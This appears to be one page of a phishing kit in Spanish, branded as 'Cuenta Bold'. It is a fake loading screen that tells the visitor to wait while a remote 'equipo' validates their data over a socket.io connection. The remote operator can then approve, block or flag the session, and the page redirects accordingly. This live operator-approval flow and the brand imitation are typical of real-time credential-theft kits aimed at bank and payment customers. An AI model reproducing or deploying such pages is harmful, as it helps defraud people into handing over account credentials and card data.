<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cuenta Bold</title>
  <style>
    :root { color-scheme: light; font-family: Inter, system-ui, sans-serif; }
    * { box-sizing: border-box; }
    body { margin: 0; min-height: 100vh; background: #f8fbff; color: #0f1b43; display: flex; align-items: center; justify-content: center; }
    .loading-screen { position: relative; width: 100%; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; background-image: url("./assets/Cuenta Bold File/login_bg.26fe7e9f.png"), radial-gradient(circle at top, rgba(94,114,255,0.85) 0%, rgba(43,44,200,0.85) 45%, rgba(20,22,61,0.95) 100%); background-size: cover; background-position: center; background-repeat: no-repeat; color: #f7fafc; text-align: center; padding: 24px; }
    .loading-screen::before { content: ""; position: absolute; inset: 0; background: rgba(8,15,36,0.35); }
    .loading-screen > * { position: relative; z-index: 1; }
    .spinner { width: 92px; height: 92px; border: 12px solid rgba(255,255,255,0.18); border-top-color: #ffffff; border-radius: 50%; animation: spin 1.1s linear infinite; margin-bottom: 28px; }
    .loading-title { font-size: 1.75rem; font-weight: 700; margin-bottom: 12px; }
    .loading-text { font-size: 1rem; color: rgba(255,255,255,0.88); max-width: 360px; line-height: 1.7; margin: 0; }
    .status-msg { margin-top: 20px; font-size: 1rem; color: rgba(255,255,255,0.9); font-weight: 600; min-height: 24px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    @media (max-width: 640px) { .loading-title { font-size: 1.5rem; } .loading-text { font-size: 0.95rem; } }
  </style>
</head>
<body>
  <div class="loading-screen">
    <div class="spinner" aria-hidden="true"></div>
    <h1 class="loading-title">Estamos procesando su solicitud</h1>
    <p class="loading-text">Por favor espere mientras preparamos todo. No cierre esta ventana ni actualice la página.</p>
    <p class="status-msg" id="statusMsg">Verificando información...</p>
  </div>

  <script src="./assets/js/config.js"></script>
  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
  <script>
  (() => {
    const sessionId = sessionStorage.getItem('sessionId');
    const statusMsg = document.getElementById('statusMsg');

    if (!sessionId) {
      statusMsg.textContent = 'Sesión no encontrada. Redirigiendo...';
      setTimeout(() => { window.location.href = 'INICIO-OLD.html'; }, 2000);
      return;
    }

    const socket = io(window.API_BASE_URL);
    socket.on('connect', () => {
      socket.emit('registerSession', sessionId);
      statusMsg.textContent = 'Conectado. Esperando validación del equipo...';
    });

    socket.on('action', ({ action }) => {
      if (action === 'approved') {
        statusMsg.textContent = '✅ ¡Aprobado! Redirigiendo...';
        setTimeout(() => {
          sessionStorage.clear();
          // Redirigir a página de éxito (ajusta la URL según tu proyecto)
          window.location.href = 'AFILIACIONESPRE-APPROBADO.html';
        }, 1500);
      } else if (action === 'blocked') {
        statusMsg.textContent = '🔒 Proceso finalizado. Contacta soporte.';
      } else if (action === 'error_data') {
        statusMsg.textContent = '❌ Error en los datos. Contacta soporte.';
      } else if (action === 'error_temp') {
        statusMsg.textContent = '⚠️ Error temporal. Por favor espera.';
      }
    });

    socket.on('disconnect', () => {
      statusMsg.textContent = 'Reconectando...';
    });
  })();
  </script>
</body>
</html>
